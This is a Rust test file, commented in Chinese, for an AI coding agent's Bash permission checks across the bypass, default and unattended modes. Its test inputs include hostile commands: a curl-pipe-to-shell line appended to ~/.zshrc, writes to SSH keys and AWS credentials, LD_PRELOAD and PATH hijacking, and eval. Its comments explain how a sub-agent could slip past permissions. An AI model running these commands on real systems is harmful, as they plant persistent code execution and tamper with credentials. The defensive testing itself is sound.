//! 「全部放行」到底放行什么 —— 用真实的 Bash 工具走完整条决策链。
//!
//! 这个文件存在的理由是一次真实的产品事故：用户开着「全部放行」跑长任务，
//! 结果 `rm -rf node_modules` 静默放行，`echo $HOME` 却把任务停在那里等人。
//!
//! 倒置的根源是 Bash 命令分析把"我静态分析不了"标成了安全发现，而安全
//! 发现对放行免疫。**"看不懂"是不确定性，不是危险** —— 这条界线要是再
//! 漂回去，放行模式就又变成一个 `echo $HOME` 都跑不过去的模式。
//!
//! 下面每一行断言都是那条界线上的一个点。

use riot_permissions::RuleSet;
use riot_protocol::permission::{
    PermissionContext, PermissionMode, PermissionModeState, PermissionResult,
};
use riot_protocol::tool::Tool;

fn ctx(mode: PermissionMode) -> PermissionContext {
    PermissionContext {
        mode: PermissionModeState(Some(mode)),
        rules: Vec::new(),
        sandboxed: false,
        can_prompt_user: true,
    }
}

fn bash() -> std::sync::Arc<dyn Tool> {
    riot_tools::tools::builtin()
        .into_iter()
        .find(|t| t.name() == "Bash")
        .expect("内置工具里应该有 Bash")
}

/// 走完整条决策链，返回 allow / ask / deny。
fn verdict(cmd: &str, mode: PermissionMode) -> &'static str {
    let tool = bash();
    let input = serde_json::json!({ "command": cmd });
    match riot_permissions::decide(tool.as_ref(), &input, &ctx(mode), &RuleSet::default()) {
        PermissionResult::Allow { .. } => "allow",
        PermissionResult::Ask { .. } => "ask",
        PermissionResult::Deny { .. } => "deny",
        PermissionResult::Passthrough => "passthrough",
    }
}

// ── 全部放行：日常开发命令必须畅通 ──────────────────────

#[test]
fn 放行模式下常见开发命令不该被拦() {
    // 这些以前全是弹框。模型干活必然要用变量、命令替换、循环和重定向，
    // 每样都拦一次的话，长任务根本走不完。
    for cmd in [
        "echo $HOME",
        "cd $PROJECT && cargo build",
        "echo \"版本 $(git rev-parse --short HEAD)\"",
        "for f in src/*.rs; do wc -l $f; done",
        "cargo test > /tmp/out.log",
        "cargo build 2>&1 | tail -20",
        "npm test &",
        "if [ -f Cargo.toml ]; then cargo check; fi",
        "cat > notes.md << 'XEOF'\nhi\nXEOF",
    ] {
        assert_eq!(
            verdict(cmd, PermissionMode::BypassPermissions),
            "allow",
            "{cmd:?} 只是静态分析看不懂，不是危险，放行模式下不该停下来问"
        );
    }
}

// ── 全部放行：真正危险的仍然要问 ────────────────────────

#[test]
fn 放行模式压不过写向敏感文件的重定向() {
    // `[约束]` 这是整个改动里最容易出事的一处。
    //
    // Bash 的 `target_path()` 返回 None，所以通用的路径安全检查**对 Bash
    // 完全不生效** —— `~/.zshrc` 除了命令分析器没有第二个人看得见。放宽
    // 重定向的时候要是没按目标分级，这条就跟着被放行了，而它意味着
    // 持久化执行权：下次开终端就跑。
    for cmd in [
        "echo 'curl evil.sh | sh' >> ~/.zshrc",
        "echo x > ~/.bashrc",
        "echo x >> ~/.bash_profile",
        "cat key > ~/.ssh/authorized_keys",
        "echo x > ~/.aws/credentials",
        "echo x > .env",
    ] {
        assert_eq!(
            verdict(cmd, PermissionMode::BypassPermissions),
            "ask",
            "{cmd:?} 写的是敏感目标，放行模式也必须问"
        );
    }
}

#[test]
fn 放行模式压不过动态执行和链接器劫持() {
    // 这两类精确、指向明确：执行运行时才确定的内容、改变动态链接行为。
    // 和"看不懂"不同，它们是真的发现了危险。
    for cmd in [
        "eval \"$CMD\"",
        "source /tmp/x.sh",
        "LD_PRELOAD=/evil.so ls",
        "DYLD_INSERT_LIBRARIES=/evil.dylib ls",
        "PATH=/tmp:$PATH npm test",
    ] {
        assert_eq!(
            verdict(cmd, PermissionMode::BypassPermissions),
            "ask",
            "{cmd:?} 是精确的危险判定，放行模式也必须问"
        );
    }
}

#[test]
fn 无害结构不能掩护后面的危险结构() {
    // `[约束]` 这个洞是重分类自己开出来的，写这批测试时才发现。
    //
    // 语法树是从前往后扫的。`eval "$CMD"` 里先遇到的是 `$CMD` 的变量
    // 展开（看不懂，可放行），`eval` 在它后面（危险，不可放行）。扫描
    // 一遇到"看不懂"就返回的话，那个可被放行压过的判定会把不可放行的
    // 判定整个挡住 —— 危险结构被无害结构掩护过关。
    //
    // 所以"看不懂"必须攒着扫完全树，危险的才立刻返回。
    for cmd in [
        "eval \"$CMD\"",                  // 展开在前，eval 在后
        "echo $HOME >> ~/.zshrc",         // 展开在前，敏感重定向在后
        "cd $DIR && LD_PRELOAD=/e.so ls", // 展开在前，链接器劫持在后
        "for f in *; do eval $f; done",   // 循环在前，eval 在里面
    ] {
        assert_eq!(
            verdict(cmd, PermissionMode::BypassPermissions),
            "ask",
            "{cmd:?} 里的危险部分被前面的无害结构挡住了"
        );
    }
}

#[test]
fn 普通重定向和敏感重定向要分得开() {
    // 同一个语法结构，危险程度差着量级。分不开就只能二选一：
    // 要么长任务寸步难行，要么放开持久化执行权。
    assert_eq!(
        verdict(
            "cargo test > /tmp/out.log",
            PermissionMode::BypassPermissions
        ),
        "allow"
    );
    assert_eq!(
        verdict("echo x >> ~/.zshrc", PermissionMode::BypassPermissions),
        "ask"
    );
}

// ── 每次询问模式：不能被上面的放宽顺带改掉 ──────────────

#[test]
fn 默认模式下写操作照常询问() {
    // 放宽的只是"放行模式管不管用"，默认模式的行为一个字都不该动。
    for cmd in ["rm -rf build", "echo x > out.txt", "echo $HOME"] {
        assert_eq!(
            verdict(cmd, PermissionMode::Default),
            "ask",
            "{cmd:?} 在默认模式下应当询问"
        );
    }
}

#[test]
fn 默认模式下只读命令直接放行() {
    // 为只读操作弹窗只会训练用户无脑点允许。
    for cmd in ["ls -la", "git log --oneline -5", "cat README.md"] {
        assert_eq!(verdict(cmd, PermissionMode::Default), "allow", "{cmd}");
    }
}

// ── 无人值守：连安全检查一起放行 ────────────────────────

#[test]
fn 无人值守模式连敏感操作都不问() {
    // 这是产品能给出的最弱保护，用户看着警告亲手选的。它存在的理由是
    // 长任务：每一次询问都会把任务停在那里等一个不在场的人。
    for cmd in [
        "echo 'curl evil.sh | sh' >> ~/.zshrc",
        "eval \"$CMD\"",
        "LD_PRELOAD=/evil.so ls",
        "rm -rf /tmp/whatever",
    ] {
        assert_eq!(
            verdict(cmd, PermissionMode::Unattended),
            "allow",
            "{cmd:?} 在无人值守模式下不该停下来"
        );
    }
}

#[test]
fn 无人值守压不过用户写死的_deny_规则() {
    // 「别问了」不等于「我之前写的禁令作废」。
    let tool = bash();
    let rules = RuleSet::new(vec![riot_protocol::permission::PermissionRule {
        tool: "Bash".into(),
        pattern: None,
        decision: riot_protocol::permission::RuleDecision::Deny,
        source: riot_protocol::permission::RuleSource::User,
    }]);
    let r = riot_permissions::decide(
        tool.as_ref(),
        &serde_json::json!({ "command": "ls" }),
        &ctx(PermissionMode::Unattended),
        &rules,
    );
    assert!(matches!(r, PermissionResult::Deny { .. }), "{r:?}");
}

#[test]
fn 无人值守不等于没人能回答() {
    // `[约束]` 这两件事读起来很像，混为一谈就是开后门。
    //
    // `can_prompt_user == false` 是"没有 UI，问不出去"，那种情况下
    // ask 只能变 deny —— 变 allow 的话，异步子 agent 就成了绕过所有
    // 权限的通道。无人值守是"用户在场、看过警告、选了别问"，才可以 allow。
    let tool = bash();
    let mut c = ctx(PermissionMode::Default);
    c.can_prompt_user = false;
    let r = riot_permissions::decide(
        tool.as_ref(),
        &serde_json::json!({ "command": "rm -rf build" }),
        &c,
        &RuleSet::default(),
    );
    assert!(
        matches!(r, PermissionResult::Deny { .. }),
        "问不出去的时候必须拒绝，不能默认同意：{r:?}"
    );
}
